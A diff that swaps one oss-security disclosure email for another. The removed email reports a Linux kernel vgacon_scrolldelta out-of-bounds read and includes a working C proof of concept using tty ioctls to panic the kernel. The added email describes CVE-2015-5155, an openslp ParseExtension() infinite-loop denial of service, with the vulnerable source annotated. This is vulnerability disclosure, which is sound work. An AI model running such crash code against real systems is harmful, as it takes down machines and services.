@@ -1,9 +1,9 @@
-X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
-	["921" "Wednesday" "16" "September" "2020" "16:19:46" "+0800" "NopNop Nop" "nopitydays@gmail.com" "<CA+-U7QDboXJEpHXNa5mk-pOyBbKw63t8WefV5cmr+Hi8KsWeOQ@mail.gmail.com>" "39" "[oss-security] Linux Kernel: out-of-bounds reading in vgacon_scrolldelta" nil nil nil "9" "2020091608:19:46" "[oss-security] Linux Kernel: out-of-bounds reading in vgacon_scrolldelta" (number mark "U       nopitydays@g Sep 16   39/921   " thread-indent "\"[oss-security] Linux Kernel: out-of-bounds reading in vgacon_scrolldelta\"\n") nil nil nil nil nil nil nil nil nil "[oss-security] Linux Kernel: out-of-bounds reading in vgacon_scrolldelta" nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+X-VM-v5-Data: ([nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+	["2536" "Wednesday" "16" "September" "2015" "17:40:11" "+0800" "Qinghao Tang" "luodalongde@gmail.com" "<CAPcZBq6T5NHNfMPLoaH3OJ_ganGL+sDCQr0FeH2Mnihnceze8g@mail.gmail.com>" "142" "[oss-security] CVE-2015-5155 - openslp 1.2.1 ParseExtension() DoS vulnerability" nil nil nil "9" "2015091609:40:11" "[oss-security] CVE-2015-5155 - openslp 1.2.1 ParseExtension() DoS vulnerability" (number mark "        luodalongde@ Sep 16  142/2536  " thread-indent "\"[oss-security] CVE-2015-5155 - openslp 1.2.1 ParseExtension() DoS vulnerability\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
 	nil)
-X-Mozilla-Status: 0000
+X-Mozilla-Status: 0001
 X-Mozilla-Status2: 00000000
-Received: (qmail 5280 invoked by uid 550); 16 Sep 2020 10:13:34 -0000
+Received: (qmail 32225 invoked by uid 550); 16 Sep 2015 16:29:46 -0000
 Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
 Precedence: bulk
 List-Post: <mailto:oss-security@lists.openwall.com>
@@ -11,77 +11,167 @@ List-Help: <mailto:oss-security-help@lists.openwall.com>
 List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
 List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
 List-ID: <oss-security.lists.openwall.com>
-Reply-To: oss-security@lists.openwall.com
-Received: (qmail 16216 invoked from network); 16 Sep 2020 08:20:09 -0000
+Received: (qmail 20264 invoked from network); 16 Sep 2015 09:40:23 -0000
 DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=gmail.com; s=20161025;
-        h=mime-version:from:date:message-id:subject:to;
-        bh=HOTg6yDYzQLQcQDOHjzxJ1tr2FswNKzyqEttlIFrMxc=;
-        b=sx8MmCg/r0ZYn7Z0gCOlBFX+Uui2CjpPn4I/jaHj+WYaZEeMQpFq6xOHizNqOAI4iT
-         OnFzf3rkxBQrqD8zUA5Db4hCG1I9BPkCUQCWHvyDGQ6S0CbI4zEtyQ8Syt/VGa/K5YTO
-         w0T+XxUFtQ30BoPHgiWKgFEPpJ3tj1Uau2uBbalQ2ay/++8YGCgkQ0hYKm/1MiwveBcP
-         9yIeHGPBj5ar0UN1H9ODFnXq7qhe1lEnS6mqcaoEZn8Yz2mozBqtTnD+c9P0MOATHvEm
-         MH8G0F/gGOw1/p/jJW76tpyk/3/4QxwWFa/esZnmOxv16jJbVHkp0kaxkrbt3+SB/cJ/
-         xHJA==
-X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=1e100.net; s=20161025;
-        h=x-gm-message-state:mime-version:from:date:message-id:subject:to;
-        bh=HOTg6yDYzQLQcQDOHjzxJ1tr2FswNKzyqEttlIFrMxc=;
-        b=ZAEXy/3oW7+vmm88uX+sQSa8PAKSZD5fqbOQnZmoWjDF0oDLEDs/Oivy96dUqIx9m5
-         UiPBkI3usjTqFZ7VVuidYwOvvkWnA12+m1jRiZNYICaBZ506aUA4OUlEyiJbvJjBga1E
-         78JP5LkIYuJFiC2XBTOAUkew/+3RjGfahfnF6GiNDZuhByTfKpvNlh6ksN3hD2BDa5mB
-         pMuk7M9qZzmczMArmBCuAG7DJenoZgz/6/lGtcAh/U/Znzza17418Fq7azcEqOQ8Hjjy
-         tvFJqQCtSYHB91Rk5e1iLXRm+aeWywPEZ9U4WH4GSv/R7eBMK2oy+ExkU2FexqitjMAo
-         fSLA==
-X-Gm-Message-State: AOAM5330htNamYI/8U106xKm+8LlpGQAi4bPAkYRpm3k/62mvZwvhcWs
-	5zM9MLhrLcr/jwcziyrqeSJNDpJB2Ozv/azt4CnuQwLT2uI=
-X-Google-Smtp-Source: ABdhPJygikWqa4OjeC6jHtUtJjyO13GvVqqnxmmWtce4a5S48FOqfdj1u1PukoWIw93WzusFHrYHSTPllOpFwlhIAC4=
-X-Received: by 2002:adf:9e41:: with SMTP id v1mr27741251wre.60.1600244397316;
- Wed, 16 Sep 2020 01:19:57 -0700 (PDT)
+        d=gmail.com; s=20120113;
+        h=mime-version:date:message-id:subject:from:to:content-type;
+        bh=qAxSDypQQjO/BNMpVIPtX8vz6sRwObzPQteNo3N1QzM=;
+        b=PcfOzmS5+wRrlXJrIbH4AJajCYWbm795DMQaaq8MvP2pd8nUZwV3nGtCG3Vf49zWSp
+         n3v/nl2AD7xvV1VbpzUfvZ3t+LlnLimInIxZbZkYYbMMOZKfyMx0IDX0r5qrCwW5U41A
+         1cYRr8/SErO4siuDDnHrHFx0/g81HXjFByyUlTzsWJ9wooHFV1nphCxiMROWh1lhd4YX
+         oSAJ9Gch1lNjC0DBhId8pQXR9TTjecUgEcpWIz2dF7V4BIfa5NZpCwP62ZwiSEwPupBY
+         x+G4nQLxNJ6DPCrKFvTXzJydzTSWHXeE5f4KVENVNfGYBD2Q9q/R2jwVSNzcsJdb8Chg
+         NGmg==
 MIME-Version: 1.0
-From: NopNop Nop <nopitydays@gmail.com>
-Date: Wed, 16 Sep 2020 16:19:46 +0800
-Message-ID: <CA+-U7QDboXJEpHXNa5mk-pOyBbKw63t8WefV5cmr+Hi8KsWeOQ@mail.gmail.com>
-To: oss-security@lists.openwall.com
-Content-Type: multipart/alternative; boundary="000000000000db1c1f05af69eee1"
-Subject: [oss-security] Linux Kernel: out-of-bounds reading in vgacon_scrolldelta
+X-Received: by 10.180.90.107 with SMTP id bv11mr17418629wib.69.1442396411645;
+ Wed, 16 Sep 2015 02:40:11 -0700 (PDT)
+Message-ID: <CAPcZBq6T5NHNfMPLoaH3OJ_ganGL+sDCQr0FeH2Mnihnceze8g@mail.gmail.com>
+Content-Type: multipart/alternative; boundary=f46d043c81d4bdd4fc051fda1549
+Date: Wed, 16 Sep 2015 17:40:11 +0800
+From: Qinghao Tang <luodalongde@gmail.com>
+Reply-To: oss-security@lists.openwall.com
+Subject: [oss-security] CVE-2015-5155 - openslp 1.2.1 ParseExtension() DoS vulnerability
+To: secalert@redhat.com, oss-security@lists.openwall.com
 
---000000000000db1c1f05af69eee1
-Content-Type: text/plain; charset="UTF-8"
+--f46d043c81d4bdd4fc051fda1549
+Content-Type: text/plain; charset=UTF-8
 
-Hi,
+HI there,
 
-We found a out-of-bounds reading in vgacon_scrolldelta. This BUG is caused
-by "soff" being negative after VT_RESIZE.
 
-Our PoC (panic with CONFIG_KASAN=y):
 
-#include <stdio.h>
-#include <stdlib.h>
-#include <unistd.h>
-#include <sys/types.h>
-#include <sys/stat.h>
-#include <sys/ioctl.h>
-#include <fcntl.h>
+Greeting! This is Qinghao Tang from QIHU 360  company, China. I am a
+security researcher there.I'm writing to report a vulnerability in openslp.
 
-int main(int argc, char** argv)
+
+
+The function ParseExtension() in openslp 1.2.1 exists a vulnerability , an
+attacher can cause a denial of service (infinite loop) via a  packet with
+crafted "nextoffset" value and "extid" value.
+
+
+Let`s see how this issue  happened,the code below is from
+/openslp-1.2.1/common/slp_message.c:
+
+/*--------------------------------------------------------------------------*/
+
+int ParseExtension(SLPBuffer buffer, SLPMessage message)
+
+/* Parse extensions *after* all standard protocol fields are parsed
+*/
+
+/*--------------------------------------------------------------------------*/
+
 {
-        int fd = open("/dev/tty1", O_RDWR, 0);
 
-        unsigned short size[3] = {4, 0x254, 0};
-        ioctl(fd, 0x5609, size);
+    int             extid;
 
-        for (int i = 0; i < 110; i++) {
-                write(fd, "\x0a", 1);
+    int             nextoffset;
+
+    int             result  = SLP_ERROR_OK;
+
+
+
+
+    nextoffset = message->header.extoffset;
+
+    while(nextoffset)
+
+    {
+
+        //here,buffer->start value is stable ,and we can
+control nextoffset,so we can control buffer->curpos
+
+        buffer->curpos = buffer->start + nextoffset;
+
+        if(buffer->curpos + 5 >= buffer->end)
+
+        {
+
+            /* Extension takes us past the end of the buffer */
+
+            result = SLP_ERROR_PARSE_ERROR;
+
+            goto CLEANUP;
+
         }
-        signed int args[3] = {13, -0x400, 0};
-        ioctl(fd, 0x541c, args);
+
+
+
+        extid = AsUINT16(buffer->curpos);
+
+        buffer->curpos += 2;
+
+
+        //here,wo can control nextoffset by make a crafted packet
+
+        nextoffset = AsUINT24(buffer->curpos);
+
+        buffer->curpos += 3;
+
+
+
+        switch(extid)
+
+        {
+
+        case SLP_EXTENSION_ID_REG_PID:
+
+            if(message->header.functionid == SLP_FUNCT_SRVREG)
+
+            {
+
+                /* check to see if buffer is large enough to contain the 4
+byte pid */
+
+                if(buffer->curpos + 4 > buffer->end)
+
+                {
+
+                    result = SLP_ERROR_PARSE_ERROR;
+
+                    goto CLEANUP;
+
+                }
+
+
+
+                message->body.srvreg.pid = AsUINT32(buffer->curpos);
+
+                buffer->curpos += 4;
+
+            }
+
+            break;
+
+
+        default:
+
+            if (extid >= 0x4000 && extid <= 0x7FFF )
+
+            {
+
+                /* This is a required extension.  We better error out */
+
+                result = SLP_ERROR_MESSAGE_NOT_SUPPORTED;
+
+                goto CLEANUP;
+
+            }
+
+            break;
+
+        }
+
+    }
+
+
+CLEANUP:
+
+
+
+    return result;
+
 }
 
-Here is the commit to patch this BUG:
-https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=973c096f6a85e5b5f2a295126ba6928d9a6afd45
-
-Regards,
-Nop
-
---000000000000db1c1f05af69eee1--
+--f46d043c81d4bdd4fc051fda1549--
